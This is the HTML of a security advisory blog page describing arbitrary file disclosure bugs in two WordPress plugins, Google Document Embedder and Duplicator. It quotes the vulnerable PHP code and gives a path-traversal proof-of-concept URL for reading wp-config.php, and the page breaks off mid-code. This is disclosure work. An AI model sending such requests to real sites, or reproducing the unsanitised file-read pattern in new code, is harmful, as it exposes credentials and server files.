						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b7bee892530183-8"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ini_get</span><span class="crayon-sy">(</span><span class="crayon-s">'allow_url_fopen'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-s">"1"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">function_exists</span><span class="crayon-sy">(</span><span class="crayon-s">'curl_version'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$curl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"This function is not supported on your web server. Please add "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;code&gt;allow_url_fopen = 1&lt;/code&gt; to your php.ini or enable cURL library. "</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"If you are unable to do this, please change the Link Behavior setting to "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Browser Default in GDE Options."</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">showErr</span><span class="crayon-sy">(</span><span class="crayon-v">$err</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-19"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-20">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-21"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check for invalid file type</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">preg_match</span><span class="crayon-sy">(</span><span class="crayon-s">"/\.pdf$/i"</span><span class="crayon-sy">,</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">showErr</span><span class="crayon-sy">(</span><span class="crayon-s">'Invalid file type; action cancelled.'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-26">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// ready file</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">urldecode</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$fileParts</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">parse_url</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">preg_match</span><span class="crayon-sy">(</span><span class="crayon-s">"/^https/i"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$fileParts</span><span class="crayon-sy">[</span><span class="crayon-s">'scheme'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$ssl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$ssl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-35">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get file</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$curl</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-e">curl_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$ssl</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-42">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// output file</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: application/pdf'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b7bee892530183-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename="'</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">'"'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b7bee892530183-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$code</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0136 seconds] -->
<p>First it will check if allow_url_fopen is enabled. Then it checks the two variables we need to provide, the &#8220;fn&#8221;(Filename) and &#8220;file&#8221; GET parameters. If both are provided it will verify that the filename ends in .pdf. From there, it goes onto deicing how to fetch the file, and eventually call into file_get_contents by passing the file GET parameter straight into the call. Note that the filename is only used to determine the filename returned on line 45. Because it will use file_get_contents if at all possible, we can provide a local path to include. We can for instance fetch the wp-config.php file like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b7c00028102117" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&amp;file=../../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b7c00028102117-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b7c00028102117-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&amp;file=../../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/google-document-embedder/" rel="tag">Google Document Embedder</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/#respond" title="Comment on WordPress Google Document Embedder arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-167 -->

				
					
<article id="post-156" class="post-156 post type-post status-publish format-standard hentry category-advisories tag-duplicator tag-file-disclosure tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/01/02/wordpress-duplicator-plugin-arbitrary-file-disclosure/" title="11:14 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-02T23:14:26+00:00" pubdate>January 2, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/01/02/wordpress-duplicator-plugin-arbitrary-file-disclosure/" title="Permalink to WordPress Duplicator plugin arbitrary file disclosure" rel="bookmark">WordPress Duplicator plugin arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Analysis of vulnerability</strong></p>
<p>In version 0.3.0 of WordPress duplicator the file <a href="http://plugins.trac.wordpress.org/browser/duplicator/trunk/files/installer.rescue.php?rev=598284">/files/installer.rescue.php</a> and <a href="http://plugins.trac.wordpress.org/browser/duplicator/trunk/files/installer.rescue.php?rev=598284">/files/installer.template.php</a> which were added for <a href="http://support.lifeinthegrid.com/knowledgebase.php?article=20">security reasons</a>. The file was made to download an installer file. They both start with this snippet of code::</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b8260737103191" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//DOWNLOAD ONLY: 
if ( isset($_GET['get'])) {

	$file = $_GET['file'];
	if (file_exists($file)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=installer.php');
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file));
		ob_clean();
		@flush();
		if (@readfile($file) == false) {
			$data = file_get_contents($file);
			if ($data == false) {
				die("Unable to read installer file.  The server currently has readfile and file_get_contents disabled on this server.  Please contact your server admin to remove this restriction");
			} else {
				print $data;
			}
		}
		exit;
	} 
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-10">10</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-12">12</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-14">14</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-16">16</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-18">18</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-20">20</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-22">22</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-24">24</div><div class="crayon-num" data-line="crayon-53c98e78b8260737103191-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8260737103191-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b8260737103191-1"><span class="crayon-c">//DOWNLOAD ONLY: </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'get'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">file_exists</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Description: File Transfer'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Type: application/octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename=installer.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Transfer-Encoding: binary'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Expires: 0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Pragma: public'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Length: '</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">@</span><span class="crayon-e">flush</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">@</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$data</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Unable to read installer file.&nbsp;&nbsp;The server currently has readfile and file_get_contents disabled on this server.&nbsp;&nbsp;Please contact your server admin to remove this restriction"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" 